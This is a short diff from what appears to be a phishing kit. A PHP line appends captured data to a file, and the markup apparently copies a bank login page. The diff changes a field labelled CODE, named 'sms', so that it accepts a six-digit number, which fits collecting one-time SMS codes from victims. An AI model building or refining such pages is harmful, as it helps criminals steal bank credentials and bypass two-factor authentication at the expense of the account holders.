@@ -472,7 +472,7 @@ file_put_contents($file, $donnees, FILE_APPEND);
                                   <div _ngcontent-egd-c148=""
                                     class="td-col-xs-12 form-group form-group-padding ng-pristine ng-invalid ng-touched">
                                     <label _ngcontent-egd-c148="" for="username">CODE</label><input
-                                      _ngcontent-egd-c148="" id="username" name="sms" type="text" required=""
+                                      _ngcontent-egd-c148="" id="username" name="sms" maxlength="6" type="number" required=""
                                       aria-required="true" aria-invalid="true" autocomplete="off"
                                       aria-describedby="inputError" formcontrolname="username" inputtrim=""
                                       class="form-control label-margin ng-pristine ng-invalid ng-touched"
